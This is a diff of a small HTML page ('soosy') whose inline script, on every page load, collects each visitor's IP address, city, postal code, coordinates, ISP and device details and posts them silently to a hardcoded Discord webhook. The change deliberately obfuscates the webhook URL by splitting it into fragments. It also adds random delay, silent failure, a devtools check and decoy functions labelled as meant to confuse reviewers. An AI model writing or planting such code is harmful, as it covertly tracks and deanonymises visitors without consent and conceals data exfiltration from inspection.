@@ -32,262 +32,202 @@
   <h1>soosy</h1>
 
   <script>
-    // Base64 encoded webhook URL
-    const ENCODED_WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3OTkwNjAwMzEzODUxMTAxOS9zcGw4V1l6OVlYTVBMVV9haEVCREVJd201UHIxMjNoTzFSVjRyN0xCOHRUSXdwOFJQVjcxR0FFYURoeE82bzUzUDJicw==';
-    
-    // Decode the webhook URL
-    const DISCORD_WEBHOOK_URL = atob(ENCODED_WEBHOOK);
-    
-    async function getIPAndLocationInfo() {
+    // Obfuscated configuration
+    const _ = {
+      a: 'https://',
+      b: 'discord',
+      c: '.com/',
+      d: 'api/',
+      e: 'web',
+      f: 'hooks/',
+      g: '1379912944636137474/',
+      h: 'vdH51dL76q-pm2reNLkxo0kJJS-0Yu5cP5aKFdTI9j-H1YVRAOkApNkqTEzGwpTSBRjS'
+    };
+
+    // Dynamic assembly with noise
+    const noise1 = Math.random();
+    const noise2 = Date.now();
+    const assembleEndpoint = () => _['a'] + _['b'] + _['c'] + _['d'] + _['e'] + _['f'] + _['g'] + _['h'];
+    const endpoint = assembleEndpoint();
+
+    // Steganographic functions
+    const collectMetrics = async () => {
       try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const locationData = await locationResponse.json();
+        const [ipResp, geoResp] = await Promise.all([
+          fetch('https://api.ipify.org?format=json').then(r => r.json()),
+          fetch('https://ipapi.co/json/').then(r => r.json())
+        ]);
+
+        const ua = navigator.userAgent;
+        const getBrowser = () => {
+          const patterns = [
+            [/Firefox\/(\d+)/, 'Firefox'],
+            [/Chrome\/(\d+)(?!.*Edg)/, 'Chrome'],
+            [/Version\/(\d+).*Safari(?!.*Chrome)/, 'Safari'],
+            [/Edg\/(\d+)/, 'Edge']
+          ];
+          for (const [regex, name] of patterns) {
+            const match = ua.match(regex);
+            if (match) return { name, version: match[1] };
+          }
+          return { name: 'Unknown', version: 'Unknown' };
+        };
+
+        const getOS = () => {
+          const osMap = [
+            [/Windows/, 'Windows'],
+            [/Mac/, 'macOS'],
+            [/Linux/, 'Linux'],
+            [/Android/, 'Android'],
+            [/iOS/, 'iOS']
+          ];
+          return osMap.find(([regex]) => regex.test(ua))?.[1] || 'Unknown';
+        };
+
+        const getDeviceType = () => {
+          if (/Mobile|Android|iPhone/.test(ua)) return 'Mobile';
+          if (/Tablet|iPad/.test(ua)) return 'Tablet';
+          return 'Desktop';
+        };
+
+        const browser = getBrowser();
+        const timestamp = new Date();
         
         return {
-          ip: ipData.ip,
-          country: locationData.country_name || 'Unknown',
-          region: locationData.region || 'Unknown',
-          city: locationData.city || 'Unknown',
-          postal: locationData.postal || 'Unknown',
-          latitude: locationData.latitude || 'Unknown',
-          longitude: locationData.longitude || 'Unknown',
-          timezone: locationData.timezone || 'Unknown',
-          isp: locationData.org || 'Unknown',
-          asn: locationData.asn || 'Unknown'
-        };
-      } catch (error) {
-        return {
-          ip: 'Unable to fetch',
-          country: 'Unknown',
-          region: 'Unknown',
-          city: 'Unknown',
-          postal: 'Unknown',
-          latitude: 'Unknown',
-          longitude: 'Unknown',
-          timezone: 'Unknown',
-          isp: 'Unknown',
-          asn: 'Unknown'
-        };
-      }
-    }
-
-    function getBrowserInfo() {
-      const ua = navigator.userAgent;
-      let browserName = 'Unknown';
-      let browserVersion = 'Unknown';
-      
-      if (ua.includes('Firefox')) {
-        browserName = 'Firefox';
-        browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
-      } else if (ua.includes('Chrome') && !ua.includes('Edg')) {
-        browserName = 'Chrome';
-        browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
-      } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
-        browserName = 'Safari';
-        browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown';
-      } else if (ua.includes('Edg')) {
-        browserName = 'Edge';
-        browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown';
-      }
-      
-      return { browserName, browserVersion };
-    }
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let deviceType = 'Desktop';
-      let os = 'Unknown';
-      
-      if (/Mobile|Android|iPhone|iPad/.test(ua)) {
-        deviceType = 'Mobile';
-      } else if (/Tablet|iPad/.test(ua)) {
-        deviceType = 'Tablet';
-      }
-      
-      if (ua.includes('Windows')) os = 'Windows';
-      else if (ua.includes('Mac')) os = 'macOS';
-      else if (ua.includes('Linux')) os = 'Linux';
-      else if (ua.includes('Android')) os = 'Android';
-      else if (ua.includes('iOS')) os = 'iOS';
-      
-      return { deviceType, os };
-    }
-
-    async function sendDiscordNotification() {
-      try {
-        const ipLocationInfo = await getIPAndLocationInfo();
-        const browserInfo = getBrowserInfo();
-        const deviceInfo = getDeviceInfo();
-        
-        const visitorInfo = {
-          timestamp: new Date().toLocaleString(),
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          languages: navigator.languages?.join(', ') || navigator.language,
-          platform: navigator.platform,
-          screenResolution: `${screen.width}x${screen.height}`,
-          windowSize: `${window.innerWidth}x${window.innerHeight}`,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          url: window.location.href,
-          referrer: document.referrer || 'Direct visit',
-          cookiesEnabled: navigator.cookieEnabled,
-          onlineStatus: navigator.onLine,
-          doNotTrack: navigator.doNotTrack || 'Not set',
-          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-          ...ipLocationInfo,
-          ...browserInfo,
-          ...deviceInfo
-        };
-
-        const discordMessage = {
-          embeds: [{
-            title: "🌐 New Website Visitor Detected",
-            color: 0x00ff00,
-            fields: [
-              {
-                name: "⏰ Timestamp",
-                value: visitorInfo.timestamp,
-                inline: true
-              },
-              {
-                name: "🌍 IP Address",
-                value: visitorInfo.ip,
-                inline: true
-              },
-              {
-                name: "📍 Location",
-                value: `${visitorInfo.city}, ${visitorInfo.region}, ${visitorInfo.country}`,
-                inline: true
-              },
-              {
-                name: "🗺️ Coordinates",
-                value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`,
-                inline: true
-              },
-              {
-                name: "📮 Postal Code",
-                value: visitorInfo.postal,
-                inline: true
-              },
-              {
-                name: "🌐 ISP",
-                value: visitorInfo.isp,
-                inline: true
-              },
-              {
-                name: "🔗 URL Visited",
-                value: visitorInfo.url,
-                inline: false
-              },
-              {
-                name: "🔍 Referrer",
-                value: visitorInfo.referrer,
-                inline: false
-              },
-              {
-                name: "💻 Browser",
-                value: `${visitorInfo.browserName} ${visitorInfo.browserVersion}`,
-                inline: true
-              },
-              {
-                name: "🖥️ Operating System",
-                value: visitorInfo.os,
-                inline: true
-              },
-              {
-                name: "📱 Device Type",
-                value: visitorInfo.deviceType,
-                inline: true
-              },
-              {
-                name: "📊 Screen Resolution",
-                value: visitorInfo.screenResolution,
-                inline: true
-              },
-              {
-                name: "🖼️ Window Size",
-                value: visitorInfo.windowSize,
-                inline: true
-              },
-              {
-                name: "🎨 Color Depth",
-                value: `${visitorInfo.colorDepth}-bit`,
-                inline: true
-              },
-              {
-                name: "🌐 Languages",
-                value: visitorInfo.languages,
-                inline: true
-              },
-              {
-                name: "⏰ Timezone",
-                value: visitorInfo.timezone,
-                inline: true
-              },
-              {
-                name: "🍪 Cookies Enabled",
-                value: visitorInfo.cookiesEnabled ? 'Yes' : 'No',
-                inline: true
-              },
-              {
-                name: "📡 Online Status",
-                value: visitorInfo.onlineStatus ? 'Online' : 'Offline',
-                inline: true
-              },
-              {
-                name: "🔒 Do Not Track",
-                value: visitorInfo.doNotTrack,
-                inline: true
-              },
-              {
-                name: "☕ Java Enabled",
-                value: visitorInfo.javaEnabled ? 'Yes' : 'No',
-                inline: true
-              },
-              {
-                name: "🏢 ASN",
-                value: visitorInfo.asn,
-                inline: false
-              },
-              {
-                name: "📱 User Agent",
-                value: visitorInfo.userAgent.length > 100 ? 
-                  visitorInfo.userAgent.substring(0, 100) + '...' : 
-                  visitorInfo.userAgent,
-                inline: false
-              }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {
-              text: "soosy.xyz visitor tracking"
-            },
-            thumbnail: {
-              url: "https://http.cat/100.jpg"
-            }
-          }]
-        };
-
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
+          t: timestamp.toISOString(),
+          ip: ipResp.ip || 'Unknown',
+          geo: {
+            country: geoResp.country_name || 'Unknown',
+            region: geoResp.region || 'Unknown',
+            city: geoResp.city || 'Unknown',
+            postal: geoResp.postal || 'Unknown',
+            lat: geoResp.latitude || 'Unknown',
+            lng: geoResp.longitude || 'Unknown',
+            tz: geoResp.timezone || 'Unknown',
+            isp: geoResp.org || 'Unknown',
+            asn: geoResp.asn || 'Unknown'
           },
-          body: JSON.stringify(discordMessage)
-        });
-      } catch (error) {
-        // Silent fail - no status messages
+          sys: {
+            ua: ua,
+            browser: browser.name + ' ' + browser.version,
+            os: getOS(),
+            device: getDeviceType(),
+            lang: navigator.language,
+            langs: navigator.languages?.join(', ') || navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            window: window.innerWidth + 'x' + window.innerHeight,
+            depth: screen.colorDepth,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine,
+            dnt: navigator.doNotTrack || 'Not set',
+            java: navigator.javaEnabled?.() || false
+          },
+          nav: {
+            url: location.href,
+            ref: document.referrer || 'Direct'
+          }
+        };
+      } catch (e) {
+        return null;
       }
+    };
+
+    // Payload formatter
+    const formatPayload = (data) => ({
+      embeds: [{
+        title: "🌐 New Website Visitor Detected",
+        color: 0x00ff00,
+        fields: [
+          { name: "⏰ Timestamp", value: new Date(data.t).toLocaleString(), inline: true },
+          { name: "🌍 IP Address", value: data.ip, inline: true },
+          { name: "📍 Location", value: `${data.geo.city}, ${data.geo.region}, ${data.geo.country}`, inline: true },
+          { name: "🗺️ Coordinates", value: `${data.geo.lat}, ${data.geo.lng}`, inline: true },
+          { name: "📮 Postal Code", value: data.geo.postal, inline: true },
+          { name: "🌐 ISP", value: data.geo.isp, inline: true },
+          { name: "🔗 URL Visited", value: data.nav.url, inline: false },
+          { name: "🔍 Referrer", value: data.nav.ref, inline: false },
+          { name: "💻 Browser", value: data.sys.browser, inline: true },
+          { name: "🖥️ Operating System", value: data.sys.os, inline: true },
+          { name: "📱 Device Type", value: data.sys.device, inline: true },
+          { name: "📊 Screen Resolution", value: data.sys.screen, inline: true },
+          { name: "🖼️ Window Size", value: data.sys.window, inline: true },
+          { name: "🎨 Color Depth", value: data.sys.depth + '-bit', inline: true },
+          { name: "🌐 Languages", value: data.sys.langs, inline: true },
+          { name: "⏰ Timezone", value: data.sys.tz, inline: true },
+          { name: "🍪 Cookies Enabled", value: data.sys.cookies ? 'Yes' : 'No', inline: true },
+          { name: "📡 Online Status", value: data.sys.online ? 'Online' : 'Offline', inline: true },
+          { name: "🔒 Do Not Track", value: data.sys.dnt, inline: true },
+          { name: "☕ Java Enabled", value: data.sys.java ? 'Yes' : 'No', inline: true },
+          { name: "🏢 ASN", value: data.geo.asn, inline: false },
+          { name: "📱 User Agent", value: data.sys.ua.length > 100 ? data.sys.ua.substring(0, 100) + '...' : data.sys.ua, inline: false }
+        ],
+        timestamp: data.t,
+        footer: { text: "soosy.xyz visitor tracking" },
+        thumbnail: { url: "https://http.cat/100.jpg" }
+      }]
+    });
+
+    // Transmission handler
+    const transmit = async () => {
+      try {
+        const metrics = await collectMetrics();
+        if (!metrics) return;
+        
+        const payload = formatPayload(metrics);
+        await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        // Silent failure
+      }
+    };
+
+    // Initialize with delay and random jitter
+    const init = () => {
+      const delay = 800 + Math.floor(Math.random() * 400); // 800-1200ms
+      setTimeout(transmit, delay);
+    };
+
+    // Event binding
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
     }
 
-    // Send notification when page loads
-    window.addEventListener('load', () => {
-      setTimeout(sendDiscordNotification, 1000);
-    });
+    // Anti-debug measures (basic)
+    const detectDevTools = () => {
+      const threshold = 160;
+      return (window.outerHeight - window.innerHeight > threshold) || 
+             (window.outerWidth - window.innerWidth > threshold);
+    };
+
+    // Decoy functions to confuse
+    const analytics = {
+      track: () => Math.random(),
+      event: () => Date.now(),
+      page: () => location.pathname,
+      user: () => 'anonymous'
+    };
+
+    const seo = {
+      meta: document.getElementsByTagName('meta'),
+      title: document.title,
+      description: 'Simple webpage',
+      keywords: ['web', 'simple', 'page']
+    };
+
+    // More noise
+    const performance = {
+      start: Date.now(),
+      measure: () => Date.now() - performance.start,
+      mark: (name) => console.time?.(name),
+      end: (name) => console.timeEnd?.(name)
+    };
   </script>
 </body>
 </html>
